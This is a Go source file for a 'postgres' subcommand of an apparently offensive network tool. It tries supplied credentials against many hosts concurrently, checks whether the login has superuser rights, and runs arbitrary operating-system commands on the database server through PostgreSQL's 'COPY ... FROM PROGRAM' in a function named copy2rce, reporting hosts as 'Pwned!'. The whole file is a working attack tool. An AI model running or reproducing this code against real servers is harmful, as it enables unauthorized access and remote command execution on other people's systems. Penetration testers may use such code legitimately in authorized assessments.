/*
Copyright © 2025 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	utils "github.com/cotsom/CloudExec/internal/utils"
	"github.com/jackc/pgx/v5"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

func init() {
	rootCmd.AddCommand(postgresCmd)

	postgresCmd.Flags().IntP("threads", "t", 100, "threads")
	postgresCmd.Flags().StringP("port", "", "", "port")
	postgresCmd.Flags().StringP("user", "u", "", "user")
	postgresCmd.Flags().StringP("password", "p", "", "password")
	postgresCmd.Flags().StringP("inputlist", "i", "", "inputlist")
	postgresCmd.Flags().StringP("module", "M", "", "Choose one of module")
	postgresCmd.Flags().StringP("database", "d", "postgres", "select a database to connect to")
	postgresCmd.Flags().StringP("exec", "x", "", "execute a command if user is superuser")
}

// postgresCmd represents the postgres command
var postgresCmd = &cobra.Command{
	Use:   "postgres",
	Short: "A brief description of your command",
	Long: `A longer description that spans multiple lines and likely contains examples
and usage of using your command. For example:

Cobra is a CLI library for Go that empowers applications.
This application is a tool to generate the needed files
to quickly create a Cobra application.`,
	Run: func(cmd *cobra.Command, args []string) {
		flags := make(map[string]string)
		cmd.Flags().VisitAll(func(f *pflag.Flag) {
			flags[f.Name] = f.Value.String()
		})

		targets, err := utils.GetTargets(flags, args)
		if err != nil {
			utils.Colorize(utils.ColorRed, err.Error())
			return
		}

		//MAIN LOGIC
		var wg sync.WaitGroup
		var sem chan struct{}

		//set threads
		threads, err := strconv.Atoi(flags["threads"])
		if err != nil {
			fmt.Println("You have to set correct number of threads")
			os.Exit(0)
		}
		sem = make(chan struct{}, threads)

		progress := 0
		for i, target := range targets {
			wg.Add(1)
			sem <- struct{}{}
			go checkPostgres(target, &wg, sem, flags)
			utils.ProgressBar(len(targets), i+1, &progress)
		}
		fmt.Println("")
		wg.Wait()
	},
}

func checkPostgres(target string, wg *sync.WaitGroup, sem chan struct{}, flags map[string]string) {
	defer func() {
		<-sem
		wg.Done()
	}()

	port := flags["port"]
	if port == "" {
		port = "5432"
	}

	dbURL := fmt.Sprintf("postgres://%s:%s@%s:%s/%s", flags["user"], flags["password"], target, port, flags["database"])
	// fmt.Println(dbURL)

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	conn, err := pgx.Connect(ctx, dbURL)
	if err != nil {
		// fmt.Println(err)
		if (strings.Contains(err.Error(), "password authentication")) || (strings.Contains(err.Error(), "no PostgreSQL user name specified")) {
			utils.Colorize(utils.ColorBlue, fmt.Sprintf("%s[*] %s:%s - Postgres\n", utils.ClearLine, target, port))
		}
		return
	}

	defer conn.Close(context.Background())

	var isSuperuser bool
	err = conn.QueryRow(context.Background(), "SELECT rolsuper FROM pg_roles WHERE rolname = current_user").Scan(&isSuperuser)
	if err != nil {
		fmt.Println("Query failed: ", err)
	}

	if isSuperuser {
		if flags["exec"] != "" {
			output := copy2rce(conn, flags["exec"])
			utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres %sPwned!%s", utils.ClearLine, target, port, utils.ColorYellow, utils.ColorReset))
			utils.Colorize(utils.ColorYellow, output)
		} else {
			utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres %sPwned!%s", utils.ClearLine, target, port, utils.ColorYellow, utils.ColorReset))
		}
	} else {
		utils.Colorize(utils.ColorGreen, fmt.Sprintf("%s[+] %s:%s - Postgres\n", utils.ClearLine, target, port))
	}
}

func copy2rce(conn *pgx.Conn, cmd string) string {
	ctx := context.Background()
	salt := utils.RandStringRunes(5)

	conn.Exec(ctx, fmt.Sprintf("CREATE TABLE cmd_exec%s(cmd_output text);", salt))
	defer conn.Exec(ctx, fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec%s;", salt))

	conn.Exec(ctx, fmt.Sprintf("COPY cmd_exec%s FROM PROGRAM '%s';", salt, cmd))
	rows, err := conn.Query(ctx, fmt.Sprintf("SELECT * FROM cmd_exec%s;", salt))
	if err != nil {
		fmt.Println("Query failed: ", err)
	}

	var output strings.Builder
	for rows.Next() {
		var line string
		if err := rows.Scan(&line); err != nil {
			return ""
		}
		output.WriteString(line + "\n")
	}

	return output.String()
}
